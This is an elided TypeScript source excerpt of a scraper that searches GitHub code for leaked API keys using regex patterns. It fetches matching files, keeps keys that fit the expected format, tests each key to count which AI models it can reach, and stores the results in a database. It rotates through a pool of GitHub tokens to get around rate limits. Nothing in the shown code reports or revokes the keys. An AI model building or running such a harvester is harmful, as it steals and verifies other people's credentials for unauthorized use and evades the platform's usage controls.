...
import { storeScrapedKeys, storeValidationResult, storeValidationError } from './database';
import { getAllAvailableGitHubTokens, updateGitHubTokenStats, type GitHubToken } from './github-token-manager';
...
class DatabaseGitHubTokenManager {
  ...
  async getCurrentToken(): Promise<string | null> {
    ...
    const now = Date.now();
    if (this.availableTokens.length === 0 || now - this.lastTokenRefresh > 120000) {
  ...
  async markCurrentTokenRateLimited(resetAt?: string) {
    ...
    logger.warn(`Token ${currentToken.token_name} rate limited until ${resetTime}`);
    ...
    logger.always(`[TOKEN] Removed rate-limited token. ${this.availableTokens.length} tokens remaining`);
  }
  ...
  async markSuccess(rateLimitRemaining?: number, rateLimitResetAt?: string) {
    ...
    await updateGitHubTokenStats(currentToken.id, true, rateLimitRemaining, rateLimitResetAt);
  ...
  async rotateToNext() {
    ...
    // Move to next token
    this.currentTokenIndex = (this.currentTokenIndex + 1) % this.availableTokens.length;
    
    const nextToken = this.availableTokens[this.currentTokenIndex];
    if (nextToken) {
      logger.always(`[TOKEN] Rotated to next token: ${nextToken.token_name} (${this.currentTokenIndex + 1}/${this.availableTokens.length})`);
    }
...
export async function scrapeGitHubKeys(
  ...
  const startIdx = options?.startQueryIndex ?? Math.floor(Math.random() * allQueries.length);
  ...
  logger.always(`[SCRAPE] Starting enhanced GitHub search with ${rotatedQueries.length} queries, ${seenKeys.size} existing keys to skip`);
  ...
  logger.always(`[SCRAPE] Starting enhanced GitHub search with ${rotatedQueries.length} queries (rotated from index ${startIdx})`);

  for (let queryIdx = 0; queryIdx < rotatedQueries.length && results.length < limit; queryIdx++) {
    ...
    logger.always(`[GITHUB-ENHANCED] Query ${queryIdx + 1}/${rotatedQueries.length}: "${query}"`);
    ...
    try {
      ...
      for (let page = 1; page <= maxPagesPerQuery && results.length < limit; page++) {
        ...
        logger.always(`[GITHUB-ENHANCED] Fetching page ${page}/${maxPagesPerQuery} (sort=${sortParam}, per_page=${perPage})...`);
        ...
        logger.always(`[GITHUB-ENHANCED] Response status: ${response.status} ${response.statusText}`);

        // Extract rate limit info from headers
        const rateLimitRemaining = response.headers.get('x-ratelimit-remaining');
        const rateLimitReset = response.headers.get('x-ratelimit-reset');
        const rateLimitResetDate = rateLimitReset ? new Date(parseInt(rateLimitReset) * 1000).toISOString() : undefined;
        ...
        if (!response.ok) {
          if (response.status === 403 || response.status === 429) {
            ...
            if (tokenCount > 0) {
              ...
              logger.warn(`Rate limited, rotating to next token (${tokenCount} tokens remaining)`);
        ...
        if (remaining !== null && remaining < 10 && tokenManager.getTokenCount() > 1) {
          logger.always(`[TOKEN] Rate limit low (${remaining}), proactively rotating to preserve token`);
          await tokenManager.rotateToNext();
        }

        const data = await response.json();
        logger.always(`[GITHUB-ENHANCED] Page ${page}: Found ${data.items?.length || 0} code results`);

        // If no results on this page, stop pagination for this query
        if (!data.items || data.items.length === 0) {
          logger.always(`[GITHUB-ENHANCED] No more results for query "${query}", stopping pagination`);
          break;
        }
        ...
        for (const item of data.items || []) {
          ...
          try {
            ...
            logger.always(`[GITHUB-ENHANCED] Scanning file: ${item.repository?.full_name}/${item.name}`);
            
            // Add timeout for file fetching
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
            
            const contentResponse = await fetch(rawUrl, { signal: controller.signal });
            clearTimeout(timeoutId);
            
            if (!contentResponse.ok) {
              logger.warn(`[GITHUB-ENHANCED] Could not fetch ${item.name}: ${contentResponse.status}`);
              continue;
            }
            ...
            if (content.length > 500000) { // 500KB limit
              logger.warn(`[GITHUB-ENHANCED] Skipping large file ${item.name} (${content.length} bytes)`);
              continue;
            }
            ...
            for (const pattern of KEY_PATTERNS) {
              ...
              if (matches) {
                logger.always(`[GITHUB-ENHANCED] Found ${matches.length} potential keys in ${item.name}`);
                for (const key of matches) {
                  if (isValidKeyFormat(key)) {
                    foundKeys.add(key);
                    logger.always(`[GITHUB-ENHANCED] Valid key format: ${key.substring(0, 12)}...`);
                  }
                }
              }
            }
            ...
            for (const key of Array.from(foundKeys)) {
              if (seenKeys.has(key)) {
                progress.duplicates++;
                logger.always(`[GITHUB-ENHANCED] Duplicate key: ${key.substring(0, 12)}...`);
                continue;
              }
            ...
            if (error.name !== 'AbortError') {
              logger.error(`[GITHUB-ENHANCED] Error fetching file: ${error.message}`);
            }
          }
  ...
  logger.always(`[SCRAPE] Enhanced GitHub code search complete: Found ${results.length} new keys`);
  ...
  if (options?.validateKeys && results.length > 0) {
    ...
    for (const result of results) {
      try {
        ...
        logger.always(`Key validation complete: ${validationResult.totalModelsAccessible}/${validationResult.totalModelsTested} models accessible`);

        // Delay between validations to avoid rate limiting
        await delay(1000);
      } catch (error) {
        logger.error(`Failed to validate key ${result.key.substring(0, 12)}...: ${error}`);
    ...
    logger.always(`Validation complete: ${progress.validated}/${results.length} keys validated successfully`);
  }
...
export async function scrapeAllSources(
  ...
  logger.always(`Starting enhanced scrape (GitHub code only) with limit: ${limit}`);
  ...
  await dbLogger?.info(`Searching enhanced GitHub code with limit: ${githubLimit}`);
  ...
  await dbLogger?.info(`Found ${githubKeys.length} keys from enhanced GitHub search`, {
  ...
  logger.always(`[SCRAPE-ENHANCED] Total keys collected from enhanced GitHub search: ${results.length}`);
  ...
  if (options?.storeInDatabase && results.length > 0) {
    ...
    logger.always(`[DB] Skipping database storage (storeInDatabase=${options?.storeInDatabase})`);
  }
    ...
    for (let i = 0; i < results.length; i++) {
      ...
      try {
        ...
        if (validationResult.isValid) {
          validCount++;
          await dbLogger?.success(`Key ${i + 1}/${results.length} is valid: ${validationResult.totalModelsAccessible}/${validationResult.totalModelsTested} models`, {
            keyPreview: keyPreview + '...',
        ...
        logger.always(`Key ${i + 1}/${results.length} validation complete: ${validationResult.totalModelsAccessible}/${validationResult.totalModelsTested} models accessible`);
        ...
        await dbLogger?.error(`Failed to validate key ${i + 1}/${results.length}`, {
          keyPreview: keyPreview + '...',
          error: String(error)
        });
  ...
  logger.always(`Enhanced scraping complete: ${results.length} unique keys found`);
  return results;
}
...
export async function bulkScrapeWithValidation(options: {
  ...
  const shouldValidate = options.validateKeys || (
    typeof options.concurrentValidation === 'boolean' 
      ? options.concurrentValidation 
      : typeof options.concurrentValidation === 'number' && options.concurrentValidation > 0
  );
  
  // Scrape keys
  const scrapedKeys = await scrapeGitHubKeys(
    limit,
    options.onProgress,
    {
